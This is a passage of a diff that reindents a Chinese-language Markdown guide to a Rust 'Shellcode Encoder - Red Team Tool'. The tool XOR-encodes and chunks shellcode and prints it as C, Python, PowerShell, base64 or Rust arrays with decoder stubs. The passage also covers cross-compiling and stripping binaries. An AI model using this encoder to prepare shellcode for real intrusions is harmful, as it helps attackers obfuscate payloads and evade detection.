+ // 分块（可选）
+ let chunks: Vec<&[u8]> = if args.chunk_size > 0 {
+ processed.chunks(args.chunk_size).collect()
+ } else {
+ vec![&processed[..]]
+ };
 
-    println!("/*");
-    println!(" * Shellcode Encoder - Red Team Tool");
-    println!(" * 原始大小: {} bytes", original_len);
-    if args.xor_key != 0 {
-        println!(" * XOR 密钥: 0x{:02X}", args.xor_key);
-    }
-    if args.chunk_size > 0 {
-        println!(" * 分块大小: {} bytes (共 {} 块)", args.chunk_size, chunks.len());
-    }
-    println!(" */\n");
+ println!("/*");
+ println!(" * Shellcode Encoder - Red Team Tool");
+ println!(" * 原始大小: {} bytes", original_len);
+ if args.xor_key != 0 {
+ println!(" * XOR 密钥: 0x{:02X}", args.xor_key);
+ }
+ if args.chunk_size > 0 {
+ println!(" * 分块大小: {} bytes (共 {} 块)", args.chunk_size, chunks.len());
+ }
+ println!(" */\n");
 
-    match args.format.as_str() {
-        "hex" => {
-            println!("{}", hex_format(&processed));
-        }
-        "c" => {
-            println!("{}", c_format(&processed, &args.var_name));
-        }
-        "python" => {
-            println!("{}", python_format(&processed, &args.var_name, args.xor_key));
-        }
-        "ps1" | "powershell" => {
-            println!("{}", ps1_format(&processed, &args.var_name, args.xor_key));
-        }
-        "b64" | "base64" => {
-            let b64 = base64::engine::general_purpose::STANDARD.encode(&processed);
-            println!("{}", b64);
-        }
-        "rust" => {
-            println!("{}", rust_format(&processed, &args.var_name));
-        }
-        _ => {
-            eprintln!("不支持的格式: {}", args.format);
-            eprintln!("支持: hex, c, python, ps1, b64, rust");
-            std::process::exit(1);
-        }
-    }
+ match args.format.as_str() {
+ "hex" => {
+ println!("{}", hex_format(&processed));
+ }
+ "c" => {
+ println!("{}", c_format(&processed, &args.var_name));
+ }
+ "python" => {
+ println!("{}", python_format(&processed, &args.var_name, args.xor_key));
+ }
+ "ps1" | "powershell" => {
+ println!("{}", ps1_format(&processed, &args.var_name, args.xor_key));
+ }
+ "b64" | "base64" => {
+ let b64 = base64::engine::general_purpose::STANDARD.encode(&processed);
+ println!("{}", b64);
+ }
+ "rust" => {
+ println!("{}", rust_format(&processed, &args.var_name));
+ }
+ _ => {
+ eprintln!("不支持的格式: {}", args.format);
+ eprintln!("支持: hex, c, python, ps1, b64, rust");
+ std::process::exit(1);
+ }
+ }
 
-    Ok(())
+ Ok(())
 }
 
 fn hex_format(data: &[u8]) -> String {
-    data.iter()
-        .map(|b| format!("{:02x}", b))
-        .collect::<Vec<_>>()
-        .join("")
+ data.iter()
+ .map(|b| format!("{:02x}", b))
+ .collect::<Vec<_>>()
+ .join("")
 }
 
 fn c_format(data: &[u8], var_name: &str) -> String {
-    let mut output = format!(
-        "// C/C++ Shellcode - XOR Key: (manual)\n"
-    );
-    output.push_str(&format!(
-        "unsigned char {}[] = {{\n    ",
-        var_name
-    ));
+ let mut output = format!(
+ "// C/C++ Shellcode - XOR Key: (manual)\n"
+ );
+ output.push_str(&format!(
+ "unsigned char {}[] = {{\n ",
+ var_name
+ ));
 
-    for (i, byte) in data.iter().enumerate() {
-        if i > 0 {
-            output.push_str(", ");
-        }
-        if i % 16 == 0 && i > 0 {
-            output.push_str("\n    ");
-        }
-        output.push_str(&format!("0x{:02x}", byte));
-    }
-    output.push_str(&format!("\n}};\nunsigned int {}_len = {};\n", var_name, data.len()));
-    output
+ for (i, byte) in data.iter().enumerate() {
+ if i > 0 {
+ output.push_str(", ");
+ }
+ if i % 16 == 0 && i > 0 {
+ output.push_str("\n ");
+ }
+ output.push_str(&format!("0x{:02x}", byte));
+ }
+ output.push_str(&format!("\n}};\nunsigned int {}_len = {};\n", var_name, data.len()));
+ output
 }
 
 fn python_format(data: &[u8], var_name: &str, xor_key: u8) -> String {
-    let hex_str = hex_format(data);
-    let mut output = format!("# Python3 Shellcode\n");
+ let hex_str = hex_format(data);
+ let mut output = format!("# Python3 Shellcode\n");
 
-    if xor_key != 0 {
-        output.push_str(&format!("# XOR Key: 0x{:02X}\n\n", xor_key));
-        output.push_str(&format!(
-            "{} = bytes.fromhex('{}')\n",
-            var_name, hex_str
-        ));
-        output.push_str(&format!(
-            "{}_decoded = bytes([b ^ 0x{:02X} for b in {}])\n",
-            var_name, xor_key, var_name
-        ));
-    } else {
-        output.push_str(&format!(
-            "{} = bytes.fromhex('{}')\n",
-            var_name, hex_str
-        ));
-    }
-    output
+ if xor_key != 0 {
+ output.push_str(&format!("# XOR Key: 0x{:02X}\n\n", xor_key));
+ output.push_str(&format!(
+ "{} = bytes.fromhex('{}')\n",
+ var_name, hex_str
+ ));
+ output.push_str(&format!(
+ "{}_decoded = bytes([b ^ 0x{:02X} for b in {}])\n",
+ var_name, xor_key, var_name
+ ));
+ } else {
+ output.push_str(&format!(
+ "{} = bytes.fromhex('{}')\n",
+ var_name, hex_str
+ ));
+ }
+ output
 }
 
 fn ps1_format(data: &[u8], var_name: &str, xor_key: u8) -> String {
-    let b64 = base64::engine::general_purpose::STANDARD.encode(data);
-    let mut output = format!("# PowerShell Shellcode\n\n");
+ let b64 = base64::engine::general_purpose::STANDARD.encode(data);
+ let mut output = format!("# PowerShell Shellcode\n\n");
 
-    if xor_key != 0 {
-        output.push_str(&format!("$xorKey = 0x{:02X}\n", xor_key));
-        output.push_str(&format!(
-            "[Byte[]] ${} = [System.Convert]::FromBase64String('{}') | ForEach-Object {{ $_ -bxor $xorKey }}\n",
-            var_name, b64
-        ));
-    } else {
-        output.push_str(&format!(
-            "[Byte[]] ${} = [System.Convert]::FromBase64String('{}')\n",
-            var_name, b64
-        ));
-    }
-    output
+ if xor_key != 0 {
+ output.push_str(&format!("$xorKey = 0x{:02X}\n", xor_key));
+ output.push_str(&format!(
+ "[Byte[]] ${} = [System.Convert]::FromBase64String('{}') | ForEach-Object {{ $_ -bxor $xorKey }}\n",
+ var_name, b64
+ ));
+ } else {
+ output.push_str(&format!(
+ "[Byte[]] ${} = [System.Convert]::FromBase64String('{}')\n",
+ var_name, b64
+ ));
+ }
+ output
 }
 
 fn rust_format(data: &[u8], var_name: &str) -> String {
-    let mut output = format!("// Rust Shellcode\n\n");
-    output.push_str(&format!(
-        "let {}: [u8; {}] = [\n    ",
-        var_name,
-        data.len()
-    ));
+ let mut output = format!("// Rust Shellcode\n\n");
+ output.push_str(&format!(
+ "let {}: [u8; {}] = [\n ",
+ var_name,
+ data.len()
+ ));
 
-    for (i, byte) in data.iter().enumerate() {
-        if i > 0 {
-            output.push_str(", ");
-        }
-        if i % 16 == 0 && i > 0 {
-            output.push_str("\n    ");
-        }
-        output.push_str(&format!("0x{:02x}", byte));
-    }
-    output.push_str(&format!("\n];\n"));
-    output
+ for (i, byte) in data.iter().enumerate() {
+ if i > 0 {
+ output.push_str(", ");
+ }
+ if i % 16 == 0 && i > 0 {
+ output.push_str("\n ");
+ }
+ output.push_str(&format!("0x{:02x}", byte));
+ }
+ output.push_str(&format!("\n];\n"));
+ output
 }
 ```
 
@@ -1153,11 +1153,11 @@ cargo run --release -- -i shellcode.bin -f c -n sc --chunk-size 16
 
 ```bash
 # 安装交叉编译目标
-rustup target add x86_64-pc-windows-gnu     # Windows 64位
+rustup target add x86_64-pc-windows-gnu # Windows 64位
 rustup target add x86_64-unknown-linux-musl # Linux 静态链接
 rustup target add aarch64-unknown-linux-gnu # ARM64 Linux
-rustup target add aarch64-linux-android     # Android ARM64
-rustup target add x86_64-apple-darwin       # macOS Intel (需要 macOS SDK)
+rustup target add aarch64-linux-android # Android ARM64
+rustup target add x86_64-apple-darwin # macOS Intel (需要 macOS SDK)
 
 # 编译 Windows 版本
 cargo build --release --target x86_64-pc-windows-gnu
@@ -1168,10 +1168,10 @@ cargo build --release --target x86_64-unknown-linux-musl
 # 减小二进制体积
 # Cargo.toml:
 # [profile.release]
-# opt-level = "z"   # 优化体积
-# lto = true        # 链接时优化
+# opt-level = "z" # 优化体积
+# lto = true # 链接时优化
 # codegen-units = 1 # 更好的 LTO
-# strip = true      # 去除符号
+# strip = true # 去除符号
 
 # 进一步压缩
 strip target/release/binary
